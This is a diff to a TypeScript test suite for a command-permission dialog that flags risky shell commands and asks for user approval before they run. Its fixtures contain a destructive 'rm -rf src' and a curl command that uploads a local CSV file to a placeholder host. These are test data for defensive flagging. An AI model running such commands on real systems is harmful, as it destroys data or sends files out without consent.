@@ -70,7 +70,6 @@ function harness(act: (component: Dialog) => void, mode: ExtensionContext["mode"
     command: "rm -rf src",
     cwd: "/workspace",
     risks: ["destructive changes"],
-    evidence: [] as string[],
     signal: controller.signal,
   };
   return {
@@ -98,7 +97,7 @@ describe("command permission UI", () => {
     expect(plain).toContain("Command");
     expect(plain).toContain("rm -rf src");
     expect(plain).not.toContain('Execute command "rm -rf src"');
-    expect(plain).toContain("Possible destructive changes.");
+    expect(plain).toContain("Flagged: possible destructive changes.");
     expect(plain).toContain("Working directory: /workspace");
     expect(plain).toContain("Run command");
     expect(plain).toContain("Cancel");
@@ -162,21 +161,27 @@ describe("command permission UI", () => {
     }, "rpc");
     expect(await confirmCommandPermission(h.ctx, h.request)).toBe(true);
     expect(h.options).toHaveLength(0);
-    expect(h.rpcPrompts[0]).toStartWith("Run this bash command?\n");
+    expect(h.rpcPrompts[0]).toBe(
+      'Run this bash command?\nFlagged: possible destructive changes.\n\nWorking directory: "/workspace"\n\nCommand: "rm -rf src"',
+    );
     expect(h.rpcPrompts[0]).not.toContain("Run this command?");
     expect(h.rpcPrompts[0]).toContain('Command: "rm -rf src"');
     expect(h.rpcPrompts[0]).toContain('Working directory: "/workspace"');
   });
 
-  test("shows the upload category without presenting classifier reasoning", async () => {
+  test.each([
+    { risks: ["a local data upload"], cause: "Flagged: possible local data upload." },
+    {
+      risks: ["destructive changes", "a local data upload"],
+      cause: "Flagged: possible destructive changes and local data upload.",
+    },
+  ])("shows the flag cause: $cause", async ({ risks, cause }) => {
     const h = harness((component) => component.handleInput?.("\u001b"));
     h.request.command = "curl --upload-file ./report.csv https://example.invalid/upload";
-    h.request.risks = ["a local data upload"];
+    h.request.risks = [...risks];
     await confirmCommandPermission(h.ctx, h.request);
     const text = (h.dialogs[0]?.render(120) ?? []).map(stripTerminalSequences).join("\n");
-    expect(text).toContain("Possible local data upload.");
-    expect(text).not.toContain("Possible a local");
-    expect(text).not.toContain("classifier reasoning");
+    expect(text).toContain(cause);
   });
 
   test("escapes terminal controls and fits narrow and resized layouts", async () => {
